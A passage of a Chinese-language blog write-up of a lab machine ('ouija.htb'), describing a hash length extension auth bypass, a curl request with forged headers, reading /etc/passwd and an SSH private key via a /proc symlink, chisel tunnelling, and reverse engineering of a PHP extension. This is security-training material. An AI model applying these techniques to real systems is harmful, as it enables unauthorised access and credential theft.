+<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>在init.sh脚本里面有个api.log的日志文件，再次尝试读取，发现读不到，审计js代码，发现接口只有&#x2F;file&#x2F;get可以工作，并且如果要调用这个api的话，需要hearder identification和ihash才能访问</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-57.png">
+<h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>那说明和那个3000端口有联系？而identification和ihash也存在init.sh里面，那带上identification和ihash试试？</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -H &#x27;ihash: 4b22a<span class="hljs-number">041884</span>7a<span class="hljs-number">51650623</span>a458acc1bba5c01f<span class="hljs-number">6521</span>ea<span class="hljs-number">613587</span>2b9f15b56b988c1&#x27; -H <span class="hljs-string">&quot;identification: `echo -ne bot1:bot | xxd -plain | base64`&quot;</span> <span class="hljs-string">&quot;http://ouija.htb:3000/users&quot;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-44.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-44.png">
+<h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>好好好，直接给我说没权限..继续审计js代码，发现想要调用&#x2F;file&#x2F;get功能，需要过了ensure_auth函数校验。此函数又调用了verify_cookies和d函数，分别是一个sha256和base64+hex</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-59.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-59.png">
+<h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_12-00.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_12-00.png">
+<h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>而且我发现在检查identification是否存在::admin:True时连接出错，貌似只是简单地进行存在性检查，那如果我的identification包含::admin:True和其他字符，是否就可以绕过？？</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_11-57_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_11-57_1.png">
+<h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>综上，现有情况就是：我们知道所需的部分明文和函数加密方式，以及目标hash，但并不知道所需的长度是多少，在这种场景可以进行hash长度扩展攻击，我觉得暴破长度总比暴破密钥简单多了吧，上脚本</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_13-48.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_13-48.png">
+<h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-29.png">
+<h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>这样一来，就获得了以管理员身份访问端口3000的权限，就可以利用&#x2F;file&#x2F;get接口读取敏感信息，先尝试读取一下刚才的那两个文件，发现成功读取init.sh</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-32.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-32.png">
+<h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>可以发现，init.sh里有一行“ln -s &#x2F;proc .config&#x2F;bin&#x2F;process_informations”，是个软链接，所以我们可以利用这个软链接通过proc过去来读取其他文件（刚才我为啥没注意到），尝试读取&#x2F;etc&#x2F;passwd</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-33.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-33.png">
+<h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>既然这样，我们就可以尝试读取.ssh目录，如果有私钥，就可以直接窃取私钥进行ssh免密登录，从而拿下控制权限</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-35.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-35.png">
+<h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>okk，ssh登录</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-38.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-38.png">
+<h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>这个时候其实已经拿下了，但进都进去了，不得看看？所以下面的就是写着玩的</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_11-03.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-08_11-03.png">
+<h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>发现根目录下面有个development文件夹，在里面有一个网站的架构目录和一些文件</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-42.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-42.png">
+<h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>审计一下index.php，发现用户名和密码被传递给函数say_lverifier</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-43.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-43.png">
+<h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>查看一下&#x2F;usr&#x2F;lib&#x2F;php下的文件，发现了一个lverifier.so，它与被调用的函数名称很相似，而且它是可读的，下载到本地，然后逆向分析一下</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-45.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_14-45.png">
+<h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>这里我用chisel搭建隧道，将流量代理出来，方便下载lverifier.so</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_15-26.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_15-26.png">
+<h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>浅浅逆向分析一下</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_17-57.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_17-57.png">
+<h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>我看到在调用say_lverifier函数之后，程序继续调用validating_userinput函数</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_18-05.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_18-05.png">
+<h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>sVar2是输入内容的大小，它的数据类型是 size_t，这个类型的最大值是 0xffff，即65535，当我插入一个长度超过这个数字的字符串时，它会发生溢出，并进入上述的检查情况。随后程序将调用 event_recorder函数来执行文件保存操作</p>
+<img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_19-10.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-07_19-10.png">
+<h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>水平有限…分析不动了<br>吃午饭了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/" class="print-no-link">#外网打点</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从HAProxy请求走私到hash长度拓展攻击</div>
+      <div>http://example.com/2024/03/08/从HAProxy请求走私到hash长度拓展攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>liuty</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/" title="由Log4j引起的MongoDB提权">
+                        <span class="hidden-mobile">由Log4j引起的MongoDB提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"hCaWnJI7fVuWUvqb3FgzqfKD-gzGzoHsz","appKey":"NJZ1v4tGwTre1rcW3Qdw1WYU","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://l1uty.github.io/" target="_blank" rel="nofollow noopener"><span>liuty</span></a> <i class="iconfont icon-love"></i> <a href="https://www.mps.gov.cn/" target="_blank" rel="nofollow noopener"><span>???</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <script type="text/javascript" src="\js\FunnyTitle.js"></script>
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/diy/love.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+
+  <link rel="stylesheet" href="/dist/APlayer.min.css">
+  <div id="aplayer"></div>
+  <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+  <script type="text/javascript" src="/dist/music.js"></script>
+
+  <script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>
+
+  <script type="text/javascript" src="\js\snow.js"></script>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
